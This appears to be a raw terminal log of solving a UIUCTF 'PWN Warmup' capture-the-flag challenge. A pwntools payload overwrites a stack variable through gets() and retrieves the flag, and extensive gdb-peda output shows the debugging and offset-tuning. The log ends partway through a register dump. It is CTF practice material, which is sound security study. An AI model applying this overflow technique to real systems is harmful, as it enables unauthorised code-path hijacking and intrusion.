```
kali@kali:~/uiuc$ python
Python 2.7.17 (default, Jan 19 2020, 19:54:54) 
[GCC 9.2.1 20200110] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 
>>> 
>>> from pwn import *
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/kali/.pwntools-cache-2.7/update to 'never'.
[*] A newer version of pwntools is available on pypi (4.0.1 --> 4.2.1).
    Update with: $ pip install -U pwntools
>>> 
>>> 
>>> payload = "A"*16
>>> payload += p64(0x12345678)
>>> payload += "A"*12
>>> payload
'AAAAAAAAAAAAAAAAxV4\x12\x00\x00\x00\x00AAAAAAAAAAAA'
>>> c = remote('chal.uiuc.tf', 2003)
[x] Opening connection to chal.uiuc.tf on port 2003
[x] Opening connection to chal.uiuc.tf on port 2003: Trying 3.128.242.255
[+] Opening connection to chal.uiuc.tf on port 2003: Done
>>> c.send(payload)
>>> c.interactive()
[*] Switching to interactive mode
This is UIUCTF PWN Warmup, what could possibly be happening under here hmm...

uiuctf{stupid_flag_i_just_fell_out_of_the_bag}[*] Got EOF while reading in interactive

exit
[*] Closed connection to chal.uiuc.tf port 2003
[*] Got EOF while sending in interactive
>>> 

```

Log:
```
gdb-peda$ run <<< $(python -c "print 'A'*32")
Starting program: /home/kali/uiuc/pwn-warmup <<< $(python -c "print 'A'*32")
This is UIUCTF PWN Warmup, what could possibly be happening under here hmm...
[----------------------------------registers-----------------------------------]
EAX: 0xffffd308 ('A' <repeats 32 times>)
EBX: 0x56556fb8 --> 0x1ec0 
ECX: 0xf7fb15c0 --> 0xfbad208b 
EDX: 0xf7fb301c --> 0x0 
ESI: 0xf7fb1000 --> 0x1d6d6c 
EDI: 0xf7fb1000 --> 0x1d6d6c 
EBP: 0xffffd328 --> 0xffffd300 --> 0xf7fe42d0 (push   ebp)
ESP: 0xffffd300 --> 0xf7fe42d0 (push   ebp)
EIP: 0x56555752 (<vulnerable+48>:       cmp    DWORD PTR [ebp-0xc],0x12345678)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56555748 <vulnerable+38>:  mov    ebx,eax
   0x5655574a <vulnerable+40>:  call   0x565554d0 <gets@plt>
   0x5655574f <vulnerable+45>:  add    esp,0x10
=> 0x56555752 <vulnerable+48>:  cmp    DWORD PTR [ebp-0xc],0x12345678
   0x56555759 <vulnerable+55>:  je     0x56555769 <vulnerable+71>
   0x5655575b <vulnerable+57>:  cmp    DWORD PTR [ebp-0x10],0x12345678
   0x56555762 <vulnerable+64>:  jne    0x56555769 <vulnerable+71>
   0x56555764 <vulnerable+66>:  call   0x5655569d <give_flag>
[------------------------------------stack-------------------------------------]
0000| 0xffffd300 --> 0xf7fe42d0 (push   ebp)
0004| 0xffffd304 --> 0xf7fb1000 --> 0x1d6d6c 
0008| 0xffffd308 ('A' <repeats 32 times>)
0012| 0xffffd30c ('A' <repeats 28 times>)
0016| 0xffffd310 ('A' <repeats 24 times>)
0020| 0xffffd314 ('A' <repeats 20 times>)
0024| 0xffffd318 ('A' <repeats 16 times>)
0028| 0xffffd31c ('A' <repeats 12 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x56555752 in vulnerable ()
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]
EAX: 0xffffd308 ('A' <repeats 32 times>)
EBX: 0x56556fb8 --> 0x1ec0 
ECX: 0xf7fb15c0 --> 0xfbad208b 
EDX: 0xf7fb301c --> 0x0 
ESI: 0xf7fb1000 --> 0x1d6d6c 
EDI: 0xf7fb1000 --> 0x1d6d6c 
EBP: 0xffffd328 --> 0xffffd300 --> 0xf7fe42d0 (push   ebp)
ESP: 0xffffd300 --> 0xf7fe42d0 (push   ebp)
EIP: 0x5655575b (<vulnerable+57>:       cmp    DWORD PTR [ebp-0x10],0x12345678)
EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5655574f <vulnerable+45>:  add    esp,0x10
   0x56555752 <vulnerable+48>:  cmp    DWORD PTR [ebp-0xc],0x12345678
   0x56555759 <vulnerable+55>:  je     0x56555769 <vulnerable+71>
=> 0x5655575b <vulnerable+57>:  cmp    DWORD PTR [ebp-0x10],0x12345678
   0x56555762 <vulnerable+64>:  jne    0x56555769 <vulnerable+71>
   0x56555764 <vulnerable+66>:  call   0x5655569d <give_flag>
   0x56555769 <vulnerable+71>:  nop
   0x5655576a <vulnerable+72>:  mov    ebx,DWORD PTR [ebp-0x4]
[------------------------------------stack-------------------------------------]
0000| 0xffffd300 --> 0xf7fe42d0 (push   ebp)
0004| 0xffffd304 --> 0xf7fb1000 --> 0x1d6d6c 
0008| 0xffffd308 ('A' <repeats 32 times>)
0012| 0xffffd30c ('A' <repeats 28 times>)
0016| 0xffffd310 ('A' <repeats 24 times>)
0020| 0xffffd314 ('A' <repeats 20 times>)
0024| 0xffffd318 ('A' <repeats 16 times>)
0028| 0xffffd31c ('A' <repeats 12 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x5655575b in vulnerable ()
gdb-peda$ c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x5655572e (<vulnerable+12>:       add    eax,0x188a)
ECX: 0xf7fb1d80 --> 0xfbad2887 
EDX: 0xf7fb301c --> 0x0 
ESI: 0xf7fb1000 --> 0x1d6d6c 
EDI: 0xf7fb1000 --> 0x1d6d6c 
EBP: 0xf7fe42d0 (push   ebp)
ESP: 0xf7fb1d80 --> 0xfbad2887 
EIP: 0x0
EFLAGS: 0x10216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x0
[------------------------------------stack-------------------------------------]
0000| 0xf7fb1d80 --> 0xfbad2887 
0004| 0xf7fb1d84 --> 0xf7fb1dc7 --> 0xfb30100a 
0008| 0xf7fb1d88 --> 0xf7fb1dc7 --> 0xfb30100a 
0012| 0xf7fb1d8c --> 0xf7fb1dc7 --> 0xfb30100a 
0016| 0xf7fb1d90 --> 0xf7fb1dc7 --> 0xfb30100a 
0020| 0xf7fb1d94 --> 0xf7fb1dc7 --> 0xfb30100a 
0024| 0xf7fb1d98 --> 0xf7fb1dc7 --> 0xfb30100a 
0028| 0xf7fb1d9c --> 0xf7fb1dc7 --> 0xfb30100a 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000 in ?? ()
gdb-peda$ disas vulnerbale
No symbol table is loaded.  Use the "file" command.
gdb-peda$ disas vulnerable
Dump of assembler code for function vulnerable:
   0x56555722 <+0>:     push   ebp
   0x56555723 <+1>:     mov    ebp,esp
   0x56555725 <+3>:     push   ebx
   0x56555726 <+4>:     sub    esp,0x24
   0x56555729 <+7>:     call   0x565557dd <__x86.get_pc_thunk.ax>
   0x5655572e <+12>:    add    eax,0x188a
   0x56555733 <+17>:    mov    DWORD PTR [ebp-0xc],0x12345678
   0x5655573a <+24>:    mov    DWORD PTR [ebp-0x10],0x12345678
   0x56555741 <+31>:    sub    esp,0xc
   0x56555744 <+34>:    lea    edx,[ebp-0x20]
   0x56555747 <+37>:    push   edx
   0x56555748 <+38>:    mov    ebx,eax
   0x5655574a <+40>:    call   0x565554d0 <gets@plt>
   0x5655574f <+45>:    add    esp,0x10
   0x56555752 <+48>:    cmp    DWORD PTR [ebp-0xc],0x12345678
   0x56555759 <+55>:    je     0x56555769 <vulnerable+71>
   0x5655575b <+57>:    cmp    DWORD PTR [ebp-0x10],0x12345678
   0x56555762 <+64>:    jne    0x56555769 <vulnerable+71>
   0x56555764 <+66>:    call   0x5655569d <give_flag>
   0x56555769 <+71>:    nop
   0x5655576a <+72>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x5655576d <+75>:    leave  
   0x5655576e <+76>:    ret    
End of assembler dump.
gdb-peda$ break *0x56555764
Breakpoint 3 at 0x56555764
gdb-peda$ run <<< $(python -c "print 'A'*32")
Starting program: /home/kali/uiuc/pwn-warmup <<< $(python -c "print 'A'*32")
This is UIUCTF PWN Warmup, what could possibly be happening under here hmm...
[----------------------------------registers-----------------------------------]
EAX: 0xffffd308 ('A' <repeats 32 times>)
EBX: 0x56556fb8 --> 0x1ec0 
ECX: 0xf7fb15c0 --> 0xfbad208b 
EDX: 0xf7fb301c --> 0x0 
ESI: 0xf7fb1000 --> 0x1d6d6c 
EDI: 0xf7fb1000 --> 0x1d6d6c 
EBP: 0xffffd328 --> 0xffffd300 --> 0xf7fe42d0 (push   ebp)
ESP: 0xffffd300 --> 0xf7fe42d0 (push   ebp)
EIP: 0x56555752 (<vulnerable+48>:       cmp    DWORD PTR [ebp-0xc],0x12345678)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56555748 <vulnerable+38>:  mov    ebx,eax
   0x5655574a <vulnerable+40>:  call   0x565554d0 <gets@plt>
   0x5655574f <vulnerable+45>:  add    esp,0x10
=> 0x56555752 <vulnerable+48>:  cmp    DWORD PTR [ebp-0xc],0x12345678
   0x56555759 <vulnerable+55>:  je     0x56555769 <vulnerable+71>
   0x5655575b <vulnerable+57>:  cmp    DWORD PTR [ebp-0x10],0x12345678
   0x56555762 <vulnerable+64>:  jne    0x56555769 <vulnerable+71>
   0x56555764 <vulnerable+66>:  call   0x5655569d <give_flag>
[------------------------------------stack-------------------------------------]
0000| 0xffffd300 --> 0xf7fe42d0 (push   ebp)
0004| 0xffffd304 --> 0xf7fb1000 --> 0x1d6d6c 
0008| 0xffffd308 ('A' <repeats 32 times>)
0012| 0xffffd30c ('A' <repeats 28 times>)
0016| 0xffffd310 ('A' <repeats 24 times>)
0020| 0xffffd314 ('A' <repeats 20 times>)
0024| 0xffffd318 ('A' <repeats 16 times>)
0028| 0xffffd31c ('A' <repeats 12 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x56555752 in vulnerable ()
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]
EAX: 0xffffd308 ('A' <repeats 32 times>)
EBX: 0x56556fb8 --> 0x1ec0 
ECX: 0xf7fb15c0 --> 0xfbad208b 
EDX: 0xf7fb301c --> 0x0 
ESI: 0xf7fb1000 --> 0x1d6d6c 
EDI: 0xf7fb1000 --> 0x1d6d6c 
EBP: 0xffffd328 --> 0xffffd300 --> 0xf7fe42d0 (push   ebp)
ESP: 0xffffd300 --> 0xf7fe42d0 (push   ebp)
EIP: 0x5655575b (<vulnerable+57>:       cmp    DWORD PTR [ebp-0x10],0x12345678)
EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5655574f <vulnerable+45>:  add    esp,0x10
   0x56555752 <vulnerable+48>:  cmp    DWORD PTR [ebp-0xc],0x12345678
   0x56555759 <vulnerable+55>:  je     0x56555769 <vulnerable+71>
=> 0x5655575b <vulnerable+57>:  cmp    DWORD PTR [ebp-0x10],0x12345678
   0x56555762 <vulnerable+64>:  jne    0x56555769 <vulnerable+71>
   0x56555764 <vulnerable+66>:  call   0x5655569d <give_flag>
   0x56555769 <vulnerable+71>:  nop
   0x5655576a <vulnerable+72>:  mov    ebx,DWORD PTR [ebp-0x4]
[------------------------------------stack-------------------------------------]
0000| 0xffffd300 --> 0xf7fe42d0 (push   ebp)
0004| 0xffffd304 --> 0xf7fb1000 --> 0x1d6d6c 
0008| 0xffffd308 ('A' <repeats 32 times>)
0012| 0xffffd30c ('A' <repeats 28 times>)
0016| 0xffffd310 ('A' <repeats 24 times>)
0020| 0xffffd314 ('A' <repeats 20 times>)
0024| 0xffffd318 ('A' <repeats 16 times>)
0028| 0xffffd31c ('A' <repeats 12 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x5655575b in vulnerable ()
gdb-peda$ c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x5655572e (<vulnerable+12>:       add    eax,0x188a)
ECX: 0xf7fb1d80 --> 0xfbad2887 
EDX: 0xf7fb301c --> 0x0 
ESI: 0xf7fb1000 --> 0x1d6d6c 
EDI: 0xf7fb1000 --> 0x1d6d6c 
EBP: 0xf7fe42d0 (push   ebp)
ESP: 0xf7fb1d80 --> 0xfbad2887 
EIP: 0x0
EFLAGS: 0x10216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x0
[------------------------------------stack-------------------------------------]
0000| 0xf7fb1d80 --> 0xfbad2887 
0004| 0xf7fb1d84 --> 0xf7fb1dc7 --> 0xfb30100a 
0008| 0xf7fb1d88 --> 0xf7fb1dc7 --> 0xfb30100a 
0012| 0xf7fb1d8c --> 0xf7fb1dc7 --> 0xfb30100a 
0016| 0xf7fb1d90 --> 0xf7fb1dc7 --> 0xfb30100a 
0020| 0xf7fb1d94 --> 0xf7fb1dc7 --> 0xfb30100a 
0024| 0xf7fb1d98 --> 0xf7fb1dc7 --> 0xfb30100a 
0028| 0xf7fb1d9c --> 0xf7fb1dc7 --> 0xfb30100a 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000 in ?? ()
gdb-peda$ run <<< $(python -c "print 'A'*32")
Starting program: /home/kali/uiuc/pwn-warmup <<< $(python -c "print 'A'*32")
This is UIUCTF PWN Warmup, what could possibly be happening under here hmm...
[----------------------------------registers-----------------------------------]
EAX: 0xffffd308 ('A' <repeats 32 times>)
EBX: 0x56556fb8 --> 0x1ec0 
ECX: 0xf7fb15c0 --> 0xfbad208b 
EDX: 0xf7fb301c --> 0x0 
ESI: 0xf7fb1000 --> 0x1d6d6c 
EDI: 0xf7fb1000 --> 0x1d6d6c 
EBP: 0xffffd328 --> 0xffffd300 --> 0xf7fe42d0 (push   ebp)
ESP: 0xffffd300 --> 0xf7fe42d0 (push   ebp)
EIP: 0x56555752 (<vulnerable+48>:       cmp    DWORD PTR [ebp-0xc],0x12345678)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56555748 <vulnerable+38>:  mov    ebx,eax
   0x5655574a <vulnerable+40>:  call   0x565554d0 <gets@plt>
   0x5655574f <vulnerable+45>:  add    esp,0x10
=> 0x56555752 <vulnerable+48>:  cmp    DWORD PTR [ebp-0xc],0x12345678
   0x56555759 <vulnerable+55>:  je     0x56555769 <vulnerable+71>
   0x5655575b <vulnerable+57>:  cmp    DWORD PTR [ebp-0x10],0x12345678
   0x56555762 <vulnerable+64>:  jne    0x56555769 <vulnerable+71>
   0x56555764 <vulnerable+66>:  call   0x5655569d <give_flag>
[------------------------------------stack-------------------------------------]
0000| 0xffffd300 --> 0xf7fe42d0 (push   ebp)
0004| 0xffffd304 --> 0xf7fb1000 --> 0x1d6d6c 
0008| 0xffffd308 ('A' <repeats 32 times>)
0012| 0xffffd30c ('A' <repeats 28 times>)
0016| 0xffffd310 ('A' <repeats 24 times>)
0020| 0xffffd314 ('A' <repeats 20 times>)
0024| 0xffffd318 ('A' <repeats 16 times>)
0028| 0xffffd31c ('A' <repeats 12 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x56555752 in vulnerable ()
gdb-peda$ x/100x $ebp
0xffffd328:     0x00    0xd3    0xff    0xff    0xce    0x57    0x55    0x56
0xffffd330:     0x50    0xd3    0xff    0xff    0x00    0x00    0x00    0x00
0xffffd338:     0x00    0x00    0x00    0x00    0x11    0x88    0xdf    0xf7
0xffffd340:     0x00    0x10    0xfb    0xf7    0x00    0x10    0xfb    0xf7
0xffffd348:     0x00    0x00    0x00    0x00    0x11    0x88    0xdf    0xf7
0xffffd350:     0x01    0x00    0x00    0x00    0xe4    0xd3    0xff    0xff
0xffffd358:     0xec    0xd3    0xff    0xff    0x74    0xd3    0xff    0xff
0xffffd360:     0x6c    0x4a    0xfd    0xf7    0x00    0xd0    0xff    0xf7
0xffffd368:     0x00    0x10    0xfb    0xf7    0x00    0x00    0x00    0x00
0xffffd370:     0x50    0xd9    0xff    0xf7    0x00    0x00    0x00    0x00
0xffffd378:     0x00    0x10    0xfb    0xf7    0x00    0x10    0xfb    0xf7
0xffffd380:     0x00    0x00    0x00    0x00    0x19    0x0f    0x13    0x4d
0xffffd388:     0x09    0x09    0xba    0x0d
gdb-peda$ x/100x $ebp-0xc
0xffffd31c:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xffffd324:     0x41    0x41    0x41    0x41    0x00    0xd3    0xff    0xff
0xffffd32c:     0xce    0x57    0x55    0x56    0x50    0xd3    0xff    0xff
0xffffd334:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xffffd33c:     0x11    0x88    0xdf    0xf7    0x00    0x10    0xfb    0xf7
0xffffd344:     0x00    0x10    0xfb    0xf7    0x00    0x00    0x00    0x00
0xffffd34c:     0x11    0x88    0xdf    0xf7    0x01    0x00    0x00    0x00
0xffffd354:     0xe4    0xd3    0xff    0xff    0xec    0xd3    0xff    0xff
0xffffd35c:     0x74    0xd3    0xff    0xff    0x6c    0x4a    0xfd    0xf7
0xffffd364:     0x00    0xd0    0xff    0xf7    0x00    0x10    0xfb    0xf7
0xffffd36c:     0x00    0x00    0x00    0x00    0x50    0xd9    0xff    0xf7
0xffffd374:     0x00    0x00    0x00    0x00    0x00    0x10    0xfb    0xf7
0xffffd37c:     0x00    0x10    0xfb    0xf7
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]
EAX: 0xffffd308 ('A' <repeats 32 times>)
EBX: 0x56556fb8 --> 0x1ec0 
ECX: 0xf7fb15c0 --> 0xfbad208b 
EDX: 0xf7fb301c --> 0x0 
ESI: 0xf7fb1000 --> 0x1d6d6c 
EDI: 0xf7fb1000 --> 0x1d6d6c 
EBP: 0xffffd328 --> 0xffffd300 --> 0xf7fe42d0 (push   ebp)
ESP: 0xffffd300 --> 0xf7fe42d0 (push   ebp)
EIP: 0x5655575b (<vulnerable+57>:       cmp    DWORD PTR [ebp-0x10],0x12345678)
EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5655574f <vulnerable+45>:  add    esp,0x10
   0x56555752 <vulnerable+48>:  cmp    DWORD PTR [ebp-0xc],0x12345678
   0x56555759 <vulnerable+55>:  je     0x56555769 <vulnerable+71>
=> 0x5655575b <vulnerable+57>:  cmp    DWORD PTR [ebp-0x10],0x12345678
   0x56555762 <vulnerable+64>:  jne    0x56555769 <vulnerable+71>
   0x56555764 <vulnerable+66>:  call   0x5655569d <give_flag>
   0x56555769 <vulnerable+71>:  nop
   0x5655576a <vulnerable+72>:  mov    ebx,DWORD PTR [ebp-0x4]
[------------------------------------stack-------------------------------------]
0000| 0xffffd300 --> 0xf7fe42d0 (push   ebp)
0004| 0xffffd304 --> 0xf7fb1000 --> 0x1d6d6c 
0008| 0xffffd308 ('A' <repeats 32 times>)
0012| 0xffffd30c ('A' <repeats 28 times>)
0016| 0xffffd310 ('A' <repeats 24 times>)
0020| 0xffffd314 ('A' <repeats 20 times>)
0024| 0xffffd318 ('A' <repeats 16 times>)
0028| 0xffffd31c ('A' <repeats 12 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x5655575b in vulnerable ()
gdb-peda$ x/100x $ebp-0x1-
A syntax error in expression, near `'.
gdb-peda$ x/100x $ebp-0x10
0xffffd318:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xffffd320:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xffffd328:     0x00    0xd3    0xff    0xff    0xce    0x57    0x55    0x56
0xffffd330:     0x50    0xd3    0xff    0xff    0x00    0x00    0x00    0x00
0xffffd338:     0x00    0x00    0x00    0x00    0x11    0x88    0xdf    0xf7
0xffffd340:     0x00    0x10    0xfb    0xf7    0x00    0x10    0xfb    0xf7
0xffffd348:     0x00    0x00    0x00    0x00    0x11    0x88    0xdf    0xf7
0xffffd350:     0x01    0x00    0x00    0x00    0xe4    0xd3    0xff    0xff
0xffffd358:     0xec    0xd3    0xff    0xff    0x74    0xd3    0xff    0xff
0xffffd360:     0x6c    0x4a    0xfd    0xf7    0x00    0xd0    0xff    0xf7
0xffffd368:     0x00    0x10    0xfb    0xf7    0x00    0x00    0x00    0x00
0xffffd370:     0x50    0xd9    0xff    0xf7    0x00    0x00    0x00    0x00
0xffffd378:     0x00    0x10    0xfb    0xf7
gdb-peda$ run <<< $(python -c "print 'A'*22+'\x78\x56\x34\x12'+'A'*5")
Starting program: /home/kali/uiuc/pwn-warmup <<< $(python -c "print 'A'*22+'\x78\x56\x34\x12'+'A'*5")
This is UIUCTF PWN Warmup, what could possibly be happening under here hmm...
[----------------------------------registers-----------------------------------]
EAX: 0xffffd308 ('A' <repeats 22 times>, "xV4\022AAAAA")
EBX: 0x56556fb8 --> 0x1ec0 
ECX: 0xf7fb15c0 --> 0xfbad208b 
EDX: 0xf7fb301c --> 0x0 
ESI: 0xf7fb1000 --> 0x1d6d6c 
EDI: 0xf7fb1000 --> 0x1d6d6c 
EBP: 0xffffd328 --> 0xffffd338 --> 0x0 
ESP: 0xffffd300 --> 0xf7fe42d0 (push   ebp)
EIP: 0x56555752 (<vulnerable+48>:       cmp    DWORD PTR [ebp-0xc],0x12345678)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56555748 <vulnerable+38>:  mov    ebx,eax
   0x5655574a <vulnerable+40>:  call   0x565554d0 <gets@plt>
   0x5655574f <vulnerable+45>:  add    esp,0x10
=> 0x56555752 <vulnerable+48>:  cmp    DWORD PTR [ebp-0xc],0x12345678
   0x56555759 <vulnerable+55>:  je     0x56555769 <vulnerable+71>
   0x5655575b <vulnerable+57>:  cmp    DWORD PTR [ebp-0x10],0x12345678
   0x56555762 <vulnerable+64>:  jne    0x56555769 <vulnerable+71>
   0x56555764 <vulnerable+66>:  call   0x5655569d <give_flag>
[------------------------------------stack-------------------------------------]
0000| 0xffffd300 --> 0xf7fe42d0 (push   ebp)
0004| 0xffffd304 --> 0xf7fb1000 --> 0x1d6d6c 
0008| 0xffffd308 ('A' <repeats 22 times>, "xV4\022AAAAA")
0012| 0xffffd30c ('A' <repeats 18 times>, "xV4\022AAAAA")
0016| 0xffffd310 ('A' <repeats 14 times>, "xV4\022AAAAA")
0020| 0xffffd314 ("AAAAAAAAAAxV4\022AAAAA")
0024| 0xffffd318 ("AAAAAAxV4\022AAAAA")
0028| 0xffffd31c ("AAxV4\022AAAAA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x56555752 in vulnerable ()
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]
EAX: 0xffffd308 ('A' <repeats 22 times>, "xV4\022AAAAA")
EBX: 0x56556fb8 --> 0x1ec0 
ECX: 0xf7fb15c0 --> 0xfbad208b 
EDX: 0xf7fb301c --> 0x0 
ESI: 0xf7fb1000 --> 0x1d6d6c 
EDI: 0xf7fb1000 --> 0x1d6d6c 
EBP: 0xffffd328 --> 0xffffd338 --> 0x0 
ESP: 0xffffd300 --> 0xf7fe42d0 (push   ebp)
EIP: 0x5655575b (<vulnerable+57>:       cmp    DWORD PTR [ebp-0x10],0x12345678)
EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5655574f <vulnerable+45>:  add    esp,0x10
   0x56555752 <vulnerable+48>:  cmp    DWORD PTR [ebp-0xc],0x12345678
   0x56555759 <vulnerable+55>:  je     0x56555769 <vulnerable+71>
=> 0x5655575b <vulnerable+57>:  cmp    DWORD PTR [ebp-0x10],0x12345678
   0x56555762 <vulnerable+64>:  jne    0x56555769 <vulnerable+71>
   0x56555764 <vulnerable+66>:  call   0x5655569d <give_flag>
   0x56555769 <vulnerable+71>:  nop
   0x5655576a <vulnerable+72>:  mov    ebx,DWORD PTR [ebp-0x4]
[------------------------------------stack-------------------------------------]
0000| 0xffffd300 --> 0xf7fe42d0 (push   ebp)
0004| 0xffffd304 --> 0xf7fb1000 --> 0x1d6d6c 
0008| 0xffffd308 ('A' <repeats 22 times>, "xV4\022AAAAA")
0012| 0xffffd30c ('A' <repeats 18 times>, "xV4\022AAAAA")
0016| 0xffffd310 ('A' <repeats 14 times>, "xV4\022AAAAA")
0020| 0xffffd314 ("AAAAAAAAAAxV4\022AAAAA")
0024| 0xffffd318 ("AAAAAAxV4\022AAAAA")
0028| 0xffffd31c ("AAxV4\022AAAAA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x5655575b in vulnerable ()
gdb-peda$ c
Continuing.
[Inferior 1 (process 2062) exited normally]
Warning: not running
gdb-peda$ run <<< $(python -c "print 'A'*22+'\x78\x56\x34\x12'+'A'*6")
Starting program: /home/kali/uiuc/pwn-warmup <<< $(python -c "print 'A'*22+'\x78\x56\x34\x12'+'A'*6")
This is UIUCTF PWN Warmup, what could possibly be happening under here hmm...
[----------------------------------registers-----------------------------------]
EAX: 0xffffd308 ('A' <repeats 22 times>, "xV4\022AAAAAA")
EBX: 0x56556fb8 --> 0x1ec0 
ECX: 0xf7fb15c0 --> 0xfbad208b 
EDX: 0xf7fb301c --> 0x0 
ESI: 0xf7fb1000 --> 0x1d6d6c 
EDI: 0xf7fb1000 --> 0x1d6d6c 
EBP: 0xffffd328 --> 0xffffd300 --> 0xf7fe42d0 (push   ebp)
ESP: 0xffffd300 --> 0xf7fe42d0 (push   ebp)
EIP: 0x56555752 (<vulnerable+48>:       cmp    DWORD PTR [ebp-0xc],0x12345678)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56555748 <vulnerable+38>:  mov    ebx,eax
   0x5655574a <vulnerable+40>:  call   0x565554d0 <gets@plt>
   0x5655574f <vulnerable+45>:  add    esp,0x10
=> 0x56555752 <vulnerable+48>:  cmp    DWORD PTR [ebp-0xc],0x12345678
   0x56555759 <vulnerable+55>:  je     0x56555769 <vulnerable+71>
   0x5655575b <vulnerable+57>:  cmp    DWORD PTR [ebp-0x10],0x12345678
   0x56555762 <vulnerable+64>:  jne    0x56555769 <vulnerable+71>
   0x56555764 <vulnerable+66>:  call   0x5655569d <give_flag>
[------------------------------------stack-------------------------------------]
0000| 0xffffd300 --> 0xf7fe42d0 (push   ebp)
0004| 0xffffd304 --> 0xf7fb1000 --> 0x1d6d6c 
0008| 0xffffd308 ('A' <repeats 22 times>, "xV4\022AAAAAA")
0012| 0xffffd30c ('A' <repeats 18 times>, "xV4\022AAAAAA")
0016| 0xffffd310 ('A' <repeats 14 times>, "xV4\022AAAAAA")
0020| 0xffffd314 ("AAAAAAAAAAxV4\022AAAAAA")
0024| 0xffffd318 ("AAAAAAxV4\022AAAAAA")
0028| 0xffffd31c ("AAxV4\022AAAAAA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x56555752 in vulnerable ()
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]
EAX: 0xffffd308 ('A' <repeats 22 times>, "xV4\022AAAAAA")
EBX: 0x56556fb8 --> 0x1ec0 
ECX: 0xf7fb15c0 --> 0xfbad208b 
EDX: 0xf7fb301c --> 0x0 
ESI: 0xf7fb1000 --> 0x1d6d6c 
EDI: 0xf7fb1000 --> 0x1d6d6c 
EBP: 0xffffd328 --> 0xffffd300 --> 0xf7fe42d0 (push   ebp)
ESP: 0xffffd300 --> 0xf7fe42d0 (push   ebp)
EIP: 0x5655575b (<vulnerable+57>:       cmp    DWORD PTR [ebp-0x10],0x12345678)
EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5655574f <vulnerable+45>:  add    esp,0x10
   0x56555752 <vulnerable+48>:  cmp    DWORD PTR [ebp-0xc],0x12345678
   0x56555759 <vulnerable+55>:  je     0x56555769 <vulnerable+71>
=> 0x5655575b <vulnerable+57>:  cmp    DWORD PTR [ebp-0x10],0x12345678
   0x56555762 <vulnerable+64>:  jne    0x56555769 <vulnerable+71>
   0x56555764 <vulnerable+66>:  call   0x5655569d <give_flag>
   0x56555769 <vulnerable+71>:  nop
   0x5655576a <vulnerable+72>:  mov    ebx,DWORD PTR [ebp-0x4]
[------------------------------------stack-------------------------------------]
0000| 0xffffd300 --> 0xf7fe42d0 (push   ebp)
0004| 0xffffd304 --> 0xf7fb1000 --> 0x1d6d6c 
0008| 0xffffd308 ('A' <repeats 22 times>, "xV4\022AAAAAA")
0012| 0xffffd30c ('A' <repeats 18 times>, "xV4\022AAAAAA")
0016| 0xffffd310 ('A' <repeats 14 times>, "xV4\022AAAAAA")
0020| 0xffffd314 ("AAAAAAAAAAxV4\022AAAAAA")
0024| 0xffffd318 ("AAAAAAxV4\022AAAAAA")
0028| 0xffffd31c ("AAxV4\022AAAAAA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x5655575b in vulnerable ()
gdb-peda$ c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x5655572e (<vulnerable+12>:       add    eax,0x188a)
ECX: 0xf7fb1d80 --> 0xfbad2887 
EDX: 0xf7fb301c --> 0x0 
